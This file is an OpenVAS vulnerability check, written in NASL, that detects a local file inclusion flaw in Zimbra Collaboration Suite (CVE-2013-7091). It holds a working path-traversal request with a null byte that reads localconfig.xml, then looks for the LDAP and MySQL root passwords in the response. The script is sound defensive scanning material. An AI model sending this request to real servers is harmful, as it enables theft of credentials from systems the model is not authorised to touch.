###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zimbra_lfi_12_13.nasl 12021 2018-10-22 14:54:51Z mmartin $
#
# Zimbra Collaboration Suite Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zimbra:zimbra_collaboration_suite";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103853");
  script_version("$Revision: 12021 $");
  script_cve_id("CVE-2013-7091");
  script_bugtraq_id(64149);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Zimbra Collaboration Suite Local File Include Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 16:54:51 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-12-11 13:52:09 +0100 (Wed, 11 Dec 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_zimbra_admin_console_detect.nasl");
  script_require_ports("Services/www", 80, 7071, 7072);
  script_mandatory_keys("zimbra_web/installed");

  script_xref(name:"URL", value:"http://files.zimbra.com/website/docs/7.0/Zimbra%20OS%20Release%20Notes%207.1.4-2.pdf");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/linux/zimbra-0day-exploit-privilegie-escalation-via-lfi");
  script_xref(name:"URL", value:"http://www.zimbra.com/");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts. This could allow the attacker to compromise
  the application and the computer. Other attacks are also possible");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request which tries to read localconfig.xml");
  script_tag(name:"insight", value:"This script exploits a Local File Inclusion in
  /res/I18nMsg, AjxMsg, ZMsg, ZmMsg, AjxKeys, ZmKeys, ZdMsg, Ajx%20TemplateMsg.js.zgz which allows to read any local file.");
  script_tag(name:"solution", value:"Update to Zimbra Collaboration Suite 7.0.0 or above.");
  script_tag(name:"summary", value:"Zimbra Collaboration Suite is prone to a local file include vulnerability.");
  script_tag(name:"affected", value:"Versions 2009, 2010, 2011, 2012 and early 2013 versions are afected.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
if( dir == "/zimbraAdmin" ) dir = "";

url = dir + '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00';

req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req );

if( "zimbra_ldap_password" >< buf && "mysql_root_password" >< buf ) {
  report = report_vuln_url( url:url, port:port );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
